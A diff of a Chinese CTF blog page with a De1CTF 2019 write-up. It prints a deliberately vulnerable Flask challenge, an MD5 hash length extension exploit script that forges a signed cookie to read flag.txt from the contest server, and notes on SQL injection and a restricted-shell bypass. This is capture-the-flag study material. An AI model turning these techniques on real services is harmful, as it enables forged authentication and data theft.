@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">507</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">619</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -404,7 +404,8 @@ height:50vh;
         <p>又是一场打了n久才补题解的比赛orz……  </p>
 <h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h4><p>一道简单的哈希长度扩展攻击签到题<br>先看源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="keyword">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></p>
 <p>当action为scan的时候，可以将param的文件复制到自己的沙盒的result.txt里面，然后read的时候读result.txt文件<br>geneSign能拿到action=scan，param=flag.txt的哈希值，但是拿不到read的哈希值，因此我们哈希扩展一波拿哈希值，exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">num = <span class="number">16</span></span><br><span class="line">secret = <span class="string">"a"</span> * num</span><br><span class="line">secret_str = secret + <span class="string">'scan'</span> + <span class="string">'\80'</span></span><br><span class="line">value = <span class="string">'read'</span></span><br><span class="line">padding = <span class="number">64</span> - len(secret_str) - <span class="number">8</span></span><br><span class="line">secret_str = <span class="string">'%80'</span> + <span class="string">'%00'</span>*padding + <span class="string">'%a0'</span> + <span class="string">'%00'</span>*<span class="number">7</span> + value</span><br><span class="line">url = <span class="string">r'http://139.180.128.86/De1ta?param=scan'</span></span><br><span class="line">cookie = &#123;<span class="string">'action'</span>: secret_str, <span class="string">'sign'</span>: <span class="string">'4e5e3cd2e040a695869c672ada5af0dd'</span>&#125;</span><br><span class="line">res = requests.get(url, cookies=cookie).content</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p>
-<h4 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h4><h4 id="giftbox"><a href="#giftbox" class="headerlink" title="giftbox"></a>giftbox</h4><p>菜鸡太菜了，只能来复现一波<br>ls看一下有什么文件可读<br><img src="/assets/2019de1ctf/1.png" alt=""></p>
+<h4 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h4><p>一道组合的内网题  </p>
+<h4 id="giftbox"><a href="#giftbox" class="headerlink" title="giftbox"></a>giftbox</h4><p>菜鸡太菜了，只能来复现一波<br>ls看一下有什么文件可读<br><img src="/assets/2019de1ctf/1.png" alt=""><br>然后login处有注入，真返回incorrect，假返回not found<br><img src="/assets/2019de1ctf/2.png" alt=""><br>然后就是写个脚本注入一下就能拿到一个hint<br><img src="/assets/2019de1ctf/3.png" alt=""><br>告诉你还有一个隐藏的命令，看了一下好像还有一个eval函数，但是在launch的时候调用<br><img src="/assets/2019de1ctf/4.png" alt=""><br>同时这个shell是受限制的，所以很多命令不能直接执行，这里可以用php可变变量拼接出语句  </p>
 
     </article>
     <!-- license  -->
@@ -1472,50 +1473,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 59
+        Total : 60
         </div>
         <!-- search  -->
         
@@ -1528,6 +1488,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href="/2019/09/11/2019-bytectf-wp/">2019 bytectf wp</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1631,7 +1596,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-thejs/">code breaking thejs</a>
         </li>
     
     
@@ -1641,7 +1606,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-thejs/">code breaking thejs</a>
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href="/2019/03/25/code-breaking-lumenserial/">code breaking lumenserial</a>
         </li>
     
     
@@ -1691,12 +1656,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
         </li>
     
     
@@ -1785,12 +1750,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/很简单的xss/">很简单的xss</a>
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href="/2018/11/14/你拿不到我的源码/">你拿不到我的源码</a>
         </li>
     
     
@@ -1838,9 +1803,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="安恒杯"><span class="iconfont-archer">&#xe606;</span>安恒杯</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="MongoDB"><span class="iconfont-archer">&#xe606;</span>MongoDB</span>
     
@@ -1848,17 +1813,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php_tricks"><span class="iconfont-archer">&#xe606;</span>php_tricks</span>
     
-        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
-    
         <span class="sidebar-tag-name" data-tags="javascript"><span class="iconfont-archer">&#xe606;</span>javascript</span>
     
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="web+re"><span class="iconfont-archer">&#xe606;</span>web+re</span>
-    
-        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
@@ -1917,13 +1882,17 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="web/crypto/misc"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc</span>
     
-        <span class="sidebar-category-name" data-categories="cve"><span class="iconfont-archer">&#xe60a;</span>cve</span>
-    
         <span class="sidebar-category-name" data-categories="web/misc"><span class="iconfont-archer">&#xe60a;</span>web/misc</span>
     
         <span class="sidebar-category-name" data-categories="web/misc/crypto"><span class="iconfont-archer">&#xe60a;</span>web/misc/crypto</span>
     
+        <span class="sidebar-category-name" data-categories="cve"><span class="iconfont-archer">&#xe60a;</span>cve</span>
+    
         <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
+    
+        <span class="sidebar-category-name" data-categories="web/crypto/misc/pwn"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc/pwn</span>
+    
+        <span class="sidebar-category-name" data-categories="web/crypto/misc/pwn/re"><span class="iconfont-archer">&#xe60a;</span>web/crypto/misc/pwn/re</span>
     
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
     
